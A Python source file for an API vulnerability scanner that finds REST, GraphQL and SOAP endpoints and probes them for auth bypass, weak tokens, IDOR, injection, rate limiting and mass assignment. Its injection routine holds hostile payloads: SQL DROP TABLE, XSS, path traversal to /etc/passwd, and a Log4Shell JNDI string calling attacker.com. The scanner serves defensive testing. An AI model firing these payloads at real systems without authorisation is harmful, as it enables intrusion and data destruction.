"""
Advanced API Security Scanner
Comprehensive REST, GraphQL, and SOAP API vulnerability testing
"""

import json
import asyncio
import aiohttp
from typing import List, Dict, Any, Optional, Set
from urllib.parse import urljoin, urlparse
from pathlib import Path
import re
from dataclasses import dataclass
import time

import sys
from pathlib import Path
sys.path.append(str(Path(__file__).parent.parent))

from core.exceptions import ScanningError, NetworkError
from core.logging import get_logger

@dataclass
class APIVulnerabilityFinding:
    """Structure for API vulnerability findings"""
    vuln_type: str
    severity: str
    confidence: str
    endpoint: str
    method: str = ""
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    remediation: str = ""
    cwe_id: str = ""
    cvss_score: float = 0.0
    timestamp: str = ""

class AdvancedAPIScanner:
    """Advanced API vulnerability scanner for REST, GraphQL, and SOAP"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.logger = get_logger("api-scanner")
        self.session = None
        self.findings = []
        self.discovered_endpoints = set()
        self.api_schemas = {}
        
        # API testing configurations
        self.common_api_patterns = [
            r'/api/v\d+/',
            r'/rest/',
            r'/graphql',
            r'/soap',
            r'/api/',
            r'/v\d+/',
            r'\.json',
            r'\.xml'
        ]
        
        self.sensitive_endpoints = [
            'admin', 'users', 'login', 'auth', 'token', 'password',
            'config', 'settings', 'debug', 'test', 'internal'
        ]
    
    async def scan_target(self, target_url: str, scan_options: Dict[str, Any] = None) -> List[APIVulnerabilityFinding]:
        """Perform comprehensive API vulnerability scan"""
        if scan_options is None:
            scan_options = {}
        
        self.logger.info(f"Starting API scan for {target_url}")
        
        try:
            # Initialize HTTP session
            connector = aiohttp.TCPConnector(limit=10, limit_per_host=5)
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={'User-Agent': 'API-Scanner/5.0'}
            )
            
            # Phase 1: API Discovery
            await self._api_discovery_phase(target_url, scan_options)
            
            # Phase 2: Schema Analysis
            await self._schema_analysis_phase(scan_options)
            
            # Phase 3: Authentication Testing
            await self._authentication_testing_phase(scan_options)
            
            # Phase 4: Authorization Testing
            await self._authorization_testing_phase(scan_options)
            
            # Phase 5: Input Validation Testing
            await self._input_validation_testing_phase(scan_options)
            
            # Phase 6: Business Logic Testing
            await self._business_logic_testing_phase(scan_options)
            
            # Phase 7: Rate Limiting Testing
            await self._rate_limiting_testing_phase(scan_options)
            
            self.logger.info(f"API scan completed with {len(self.findings)} findings")
            return self.findings
            
        except Exception as e:
            self.logger.error(f"API scan failed: {e}")
            raise ScanningError(f"API scan failed: {e}")
        finally:
            if self.session:
                await self.session.close()
    
    async def _api_discovery_phase(self, target_url: str, scan_options: Dict[str, Any]):
        """Discover API endpoints and documentation"""
        self.logger.info("Phase 1: API Discovery")
        
        # Common API documentation paths
        doc_paths = [
            '/swagger.json', '/swagger.yaml', '/api-docs',
            '/openapi.json', '/openapi.yaml', '/redoc',
            '/docs', '/api/docs', '/graphql', '/graphiql',
            '/api/schema', '/schema.json', '/wsdl'
        ]
        
        for path in doc_paths:
            await self._test_endpoint_discovery(target_url, path)
        
        # Directory enumeration for API paths
        await self._enumerate_api_directories(target_url)
    
    async def _test_endpoint_discovery(self, base_url: str, path: str):
        """Test individual endpoint for API documentation"""
        try:
            url = urljoin(base_url, path)
            async with self.session.get(url) as response:
                if response.status == 200:
                    content = await response.text()
                    content_type = response.headers.get('content-type', '').lower()
                    
                    # Check for API documentation
                    if any(keyword in content.lower() for keyword in ['swagger', 'openapi', 'api', 'graphql']):
                        finding = APIVulnerabilityFinding(
                            vuln_type="API Documentation Exposure",
                            severity="Info",
                            confidence="High",
                            endpoint=url,
                            method="GET",
                            evidence=content[:500],
                            description="API documentation publicly accessible",
                            remediation="Restrict access to API documentation in production",
                            cwe_id="CWE-200"
                        )
                        self.findings.append(finding)
                        
                        # Parse schema if available
                        await self._parse_api_schema(url, content, content_type)
                    
                    self.discovered_endpoints.add(url)
                    
        except Exception as e:
            self.logger.debug(f"Failed to test endpoint {path}: {e}")
    
    async def _parse_api_schema(self, url: str, content: str, content_type: str):
        """Parse API schema from documentation"""
        try:
            if 'json' in content_type or url.endswith('.json'):
                schema = json.loads(content)
                self.api_schemas[url] = schema
                
                # Extract endpoints from OpenAPI/Swagger
                if 'paths' in schema:
                    for path, methods in schema['paths'].items():
                        for method in methods.keys():
                            endpoint_url = urljoin(url.split('/api-docs')[0], path)
                            self.discovered_endpoints.add(f"{method.upper()}:{endpoint_url}")
                            
        except Exception as e:
            self.logger.debug(f"Failed to parse schema from {url}: {e}")
    
    async def _enumerate_api_directories(self, target_url: str):
        """Enumerate common API directories and endpoints"""
        api_paths = [
            '/api/v1/users', '/api/v2/users', '/api/users',
            '/api/v1/admin', '/api/v2/admin', '/api/admin',
            '/api/v1/config', '/api/v2/config', '/api/config',
            '/rest/users', '/rest/admin', '/rest/config',
            '/api/v1/auth', '/api/v2/auth', '/api/auth'
        ]
        
        for path in api_paths:
            await self._test_endpoint_discovery(target_url, path)
    
    async def _schema_analysis_phase(self, scan_options: Dict[str, Any]):
        """Analyze discovered API schemas for security issues"""
        self.logger.info("Phase 2: Schema Analysis")
        
        for schema_url, schema in self.api_schemas.items():
            await self._analyze_schema_security(schema_url, schema)
    
    async def _analyze_schema_security(self, schema_url: str, schema: Dict):
        """Analyze API schema for security misconfigurations"""
        try:
            # Check for sensitive information in schema
            sensitive_fields = ['password', 'token', 'key', 'secret', 'private']
            
            if 'definitions' in schema or 'components' in schema:
                definitions = schema.get('definitions', {})
                if 'components' in schema:
                    definitions.update(schema['components'].get('schemas', {}))
                
                for model_name, model_def in definitions.items():
                    if 'properties' in model_def:
                        for prop_name, prop_def in model_def['properties'].items():
                            if any(sensitive in prop_name.lower() for sensitive in sensitive_fields):
                                finding = APIVulnerabilityFinding(
                                    vuln_type="Sensitive Information in API Schema",
                                    severity="Medium",
                                    confidence="High",
                                    endpoint=schema_url,
                                    parameter=prop_name,
                                    description=f"Sensitive field '{prop_name}' exposed in API schema",
                                    remediation="Remove sensitive fields from public API schemas",
                                    cwe_id="CWE-200"
                                )
                                self.findings.append(finding)
            
            # Check for missing security definitions
            if 'security' not in schema and 'securityDefinitions' not in schema:
                finding = APIVulnerabilityFinding(
                    vuln_type="Missing API Security Definitions",
                    severity="Medium",
                    confidence="High",
                    endpoint=schema_url,
                    description="API schema lacks security definitions",
                    remediation="Define security schemes and apply them to endpoints",
                    cwe_id="CWE-306"
                )
                self.findings.append(finding)
                
        except Exception as e:
            self.logger.debug(f"Failed to analyze schema {schema_url}: {e}")
    
    async def _authentication_testing_phase(self, scan_options: Dict[str, Any]):
        """Test API authentication mechanisms"""
        self.logger.info("Phase 3: Authentication Testing")
        
        for endpoint in list(self.discovered_endpoints)[:10]:  # Limit testing
            await self._test_authentication_bypass(endpoint)
            await self._test_weak_authentication(endpoint)
    
    async def _test_authentication_bypass(self, endpoint: str):
        """Test for authentication bypass vulnerabilities"""
        try:
            if ':' in endpoint:
                method, url = endpoint.split(':', 1)
            else:
                method, url = 'GET', endpoint
            
            # Test without authentication
            async with self.session.request(method, url) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    # Check if sensitive data is returned
                    if any(keyword in content.lower() for keyword in ['user', 'admin', 'config', 'secret']):
                        finding = APIVulnerabilityFinding(
                            vuln_type="Authentication Bypass",
                            severity="High",
                            confidence="Medium",
                            endpoint=url,
                            method=method,
                            description="API endpoint accessible without authentication",
                            remediation="Implement proper authentication checks",
                            cwe_id="CWE-306"
                        )
                        self.findings.append(finding)
                        
        except Exception as e:
            self.logger.debug(f"Failed to test authentication bypass for {endpoint}: {e}")
    
    async def _test_weak_authentication(self, endpoint: str):
        """Test for weak authentication mechanisms"""
        weak_tokens = ['admin', 'test', '123456', 'token', 'guest']
        
        try:
            if ':' in endpoint:
                method, url = endpoint.split(':', 1)
            else:
                method, url = 'GET', endpoint
            
            for token in weak_tokens:
                headers = {'Authorization': f'Bearer {token}'}
                async with self.session.request(method, url, headers=headers) as response:
                    if response.status == 200:
                        finding = APIVulnerabilityFinding(
                            vuln_type="Weak Authentication Token",
                            severity="High",
                            confidence="High",
                            endpoint=url,
                            method=method,
                            payload=token,
                            description=f"API accepts weak authentication token: {token}",
                            remediation="Implement strong token generation and validation",
                            cwe_id="CWE-521"
                        )
                        self.findings.append(finding)
                        break
                        
        except Exception as e:
            self.logger.debug(f"Failed to test weak authentication for {endpoint}: {e}")
    
    async def _authorization_testing_phase(self, scan_options: Dict[str, Any]):
        """Test API authorization mechanisms"""
        self.logger.info("Phase 4: Authorization Testing")
        
        # Test for horizontal and vertical privilege escalation
        await self._test_privilege_escalation()
    
    async def _test_privilege_escalation(self):
        """Test for privilege escalation vulnerabilities"""
        # This is a simplified test - real implementation would be more sophisticated
        privileged_endpoints = [ep for ep in self.discovered_endpoints if any(priv in ep.lower() for priv in ['admin', 'user', 'delete'])]
        
        for endpoint in privileged_endpoints[:5]:  # Limit testing
            try:
                if ':' in endpoint:
                    method, url = endpoint.split(':', 1)
                else:
                    method, url = 'GET', endpoint
                
                # Test with different user IDs
                for user_id in ['1', '2', 'admin', 'other']:
                    test_url = url.replace('/users/', f'/users/{user_id}/')
                    if test_url != url:
                        async with self.session.request(method, test_url) as response:
                            if response.status == 200:
                                finding = APIVulnerabilityFinding(
                                    vuln_type="Insecure Direct Object Reference",
                                    severity="High",
                                    confidence="Medium",
                                    endpoint=test_url,
                                    method=method,
                                    description="API allows access to other users' resources",
                                    remediation="Implement proper authorization checks",
                                    cwe_id="CWE-639"
                                )
                                self.findings.append(finding)
                                
            except Exception as e:
                self.logger.debug(f"Failed to test privilege escalation for {endpoint}: {e}")
    
    async def _input_validation_testing_phase(self, scan_options: Dict[str, Any]):
        """Test API input validation"""
        self.logger.info("Phase 5: Input Validation Testing")
        
        for endpoint in list(self.discovered_endpoints)[:10]:
            await self._test_injection_vulnerabilities(endpoint)
    
    async def _test_injection_vulnerabilities(self, endpoint: str):
        """Test for injection vulnerabilities in API endpoints"""
        injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "{{7*7}}",
            "../../../etc/passwd",
            "${jndi:ldap://attacker.com/a}"
        ]
        
        try:
            if ':' in endpoint:
                method, url = endpoint.split(':', 1)
            else:
                method, url = 'GET', endpoint
            
            for payload in injection_payloads:
                # Test in URL parameters
                test_url = f"{url}?test={payload}"
                
                # Test in JSON body for POST/PUT
                json_data = {"test": payload} if method in ['POST', 'PUT', 'PATCH'] else None
                
                async with self.session.request(method, test_url, json=json_data) as response:
                    content = await response.text()
                    
                    # Check for injection indicators
                    if payload in content or response.status == 500:
                        vuln_type = "SQL Injection" if "DROP TABLE" in payload else "Code Injection"
                        finding = APIVulnerabilityFinding(
                            vuln_type=vuln_type,
                            severity="High",
                            confidence="Medium",
                            endpoint=url,
                            method=method,
                            payload=payload,
                            description=f"API endpoint vulnerable to {vuln_type.lower()}",
                            remediation="Implement proper input validation and parameterized queries",
                            cwe_id="CWE-89" if "SQL" in vuln_type else "CWE-94"
                        )
                        self.findings.append(finding)
                        
        except Exception as e:
            self.logger.debug(f"Failed to test injection for {endpoint}: {e}")
    
    async def _business_logic_testing_phase(self, scan_options: Dict[str, Any]):
        """Test API business logic vulnerabilities"""
        self.logger.info("Phase 6: Business Logic Testing")
        
        await self._test_rate_limiting_bypass()
        await self._test_business_logic_flaws()
    
    async def _test_rate_limiting_bypass(self):
        """Test for rate limiting bypass vulnerabilities"""
        for endpoint in list(self.discovered_endpoints)[:3]:
            try:
                if ':' in endpoint:
                    method, url = endpoint.split(':', 1)
                else:
                    method, url = 'GET', endpoint
                
                # Send multiple requests rapidly
                tasks = []
                for i in range(20):
                    task = self.session.request(method, url)
                    tasks.append(task)
                
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                success_count = sum(1 for r in responses if hasattr(r, 'status') and r.status == 200)
                
                if success_count > 15:  # If most requests succeed
                    finding = APIVulnerabilityFinding(
                        vuln_type="Missing Rate Limiting",
                        severity="Medium",
                        confidence="High",
                        endpoint=url,
                        method=method,
                        description="API endpoint lacks proper rate limiting",
                        remediation="Implement rate limiting and throttling",
                        cwe_id="CWE-770"
                    )
                    self.findings.append(finding)
                    
            except Exception as e:
                self.logger.debug(f"Failed to test rate limiting for {endpoint}: {e}")
    
    async def _test_business_logic_flaws(self):
        """Test for business logic flaws"""
        # Test for mass assignment vulnerabilities
        for endpoint in self.discovered_endpoints:
            if 'POST:' in endpoint or 'PUT:' in endpoint:
                await self._test_mass_assignment(endpoint)
    
    async def _test_mass_assignment(self, endpoint: str):
        """Test for mass assignment vulnerabilities"""
        try:
            method, url = endpoint.split(':', 1)
            
            # Test with additional fields that shouldn't be modifiable
            dangerous_fields = {
                "id": 1,
                "admin": True,
                "role": "admin",
                "is_admin": True,
                "permission": "admin"
            }
            
            async with self.session.request(method, url, json=dangerous_fields) as response:
                if response.status in [200, 201]:
                    finding = APIVulnerabilityFinding(
                        vuln_type="Mass Assignment",
                        severity="High",
                        confidence="Medium",
                        endpoint=url,
                        method=method,
                        payload=str(dangerous_fields),
                        description="API accepts unauthorized field assignments",
                        remediation="Implement field whitelisting for API inputs",
                        cwe_id="CWE-915"
                    )
                    self.findings.append(finding)
                    
        except Exception as e:
            self.logger.debug(f"Failed to test mass assignment for {endpoint}: {e}")
    
    async def _rate_limiting_testing_phase(self, scan_options: Dict[str, Any]):
        """Test rate limiting implementation"""
        self.logger.info("Phase 7: Rate Limiting Testing")
        
        # This phase is already partially covered in business logic testing
        # Additional sophisticated rate limiting tests could be added here
        pass